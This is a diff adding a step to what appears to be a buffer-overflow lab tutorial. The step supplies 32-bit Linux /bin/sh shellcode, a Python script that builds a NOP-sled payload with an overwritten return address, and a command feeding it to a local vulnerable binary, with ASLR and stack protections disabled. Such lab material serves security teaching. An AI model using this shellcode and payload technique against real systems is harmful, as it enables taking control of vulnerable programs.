@@ -165,6 +165,48 @@ Run the attack:
 
 ---
 
+## 🧬 Step 4: Alternate Payload Example (Shellcode)
+
+If you want a second exploit pattern, you can place shellcode in the input and overwrite the return
+address so execution jumps back into the buffer.
+
+Example 32-bit Linux shellcode (`/bin/sh`) bytes:
+
+```bash
+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
+```
+
+Example payload builder (replace `RET_ADDR` with your little-endian stack/buffer address):
+
+```bash
+python - <<'PY'
+shellcode = (
+    b"\x31\xc0\x50\x68\x2f\x2f\x73\x68"
+    b"\x68\x2f\x62\x69\x6e\x89\xe3\x50"
+    b"\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
+)
+buf_to_ret = 76
+nop_sled = b"\x90" * 24
+ret_addr = b"\x90\xf0\xff\xbf"  # RET_ADDR example only
+body = nop_sled + shellcode
+if len(body) > buf_to_ret:
+    raise SystemExit("Shellcode + NOP sled too large for current offset")
+payload = body + b"A" * (buf_to_ret - len(body)) + ret_addr
+open("payload_shellcode", "wb").write(payload)
+print("Wrote payload_shellcode")
+PY
+```
+
+Run:
+
+```bash
+./vuln < payload_shellcode
+```
+
+Note: this only works reliably in the lab setup (e.g., `-z execstack`, ASLR off, and correct return address).
+
+---
+
 ## 🚧 Disable ASLR (for predictability)
 
 ```bash
